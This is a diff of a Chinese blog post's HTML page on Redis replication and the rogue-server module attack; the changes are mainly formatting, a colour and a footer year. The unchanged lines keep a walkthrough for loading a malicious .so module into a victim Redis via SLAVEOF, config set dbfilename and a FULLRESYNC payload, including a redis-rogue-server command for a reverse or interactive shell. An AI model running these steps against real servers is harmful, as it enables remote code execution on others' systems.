@@ -260,7 +260,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Redis/" style="color: #00bcd4">Redis</a>
+                <a href="/blog/tags/Redis/" style="color: #00a596">Redis</a>
             </span>
             
             <span class="tag">
@@ -453,17 +453,18 @@ redis-cli -p 6379
 127.0.0.1:6379&gt; get test
 &quot;test&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>可以看到数据达到了同步效果，如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
+<p>可以看到数据达到了同步效果，<code>INFO replication</code> 查看当前的主机器信息</p>
+<p>如果我们想解除主从关系可以执行 <code>SLAVEOF NO ONE</code></p>
 <hr>
 <h2 id="Redis-module"><a href="#Redis-module" class="headerlink" title="Redis module"></a>Redis module</h2><p>Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能</p>
-<p>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中</p>
-<p>恶意so文件：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>Redis模块是动态库，可以在启动时或使用 <code>MODULE LOAD</code>  命令加载到 Redis 中，<code>MODULE LIST</code> 查看已加载的模块</p>
+<p>恶意so文件： <a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>rogue<span class="token operator">-</span>server<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token number">.200</span><span class="token number">.38</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token number">.200</span><span class="token number">.4</span> <span class="token operator">-</span><span class="token operator">-</span>exp <span class="token punctuation">.</span><span class="token operator">/</span>exp<span class="token punctuation">.</span>so <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>有两种模式，一种是交互式shell，一种是反弹shell</p>
 <hr>
 <h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol>
-<li><p>配置一个我们需要以master身份给slave传输so文件的服务</p>
+<li><p>配置一个我们需要以 master 身份给 slave 传输 so 文件的服务</p>
 <pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">PING 测试连接是否可用
 +PONG 告诉slave连接可用
 REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
@@ -472,13 +473,13 @@ REPLCONF 发送REPLCONF capa
 +OK 告诉slave成功接受
 PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </li>
-<li><p>将要攻击的redis服务器设置成我们的slave</p>
+<li><p>将要攻击的 redis 服务器设置成我们的 slave</p>
 <pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">SLAVEOF ip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
-<li><p>设置RDB文件（注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用<code>config set dir path</code>）</p>
+<li><p>设置 RDB 文件（注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用 <code>config set dir path</code>）</p>
 <pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">config set dbfilename exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
-<li><p>告诉slave使用全量复制并从我们配置的Rouge Server接收module（其中<code>&lt;runid&gt;</code>无要求，不过长度一般为40，<code>&lt;offest&gt;</code>一般设置为1）</p>
+<li><p>告诉 slave 使用全量复制并从我们配置的 Rouge Server 接收 module（其中 <code>&lt;runid&gt;</code> 无要求，不过长度一般为40，<code>&lt;offest&gt;</code> 一般设置为1）</p>
 <pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 <hr>
@@ -647,7 +648,7 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
     <div id="footer-wrap">
         <div>
             &copy;
-            2022 - 2025 雲流のLowest World
+            2022 - 2026 雲流のLowest World
             <span id="footer-icon">
                 <i class="fa-solid fa-font-awesome fa-fw"></i>
             </span>
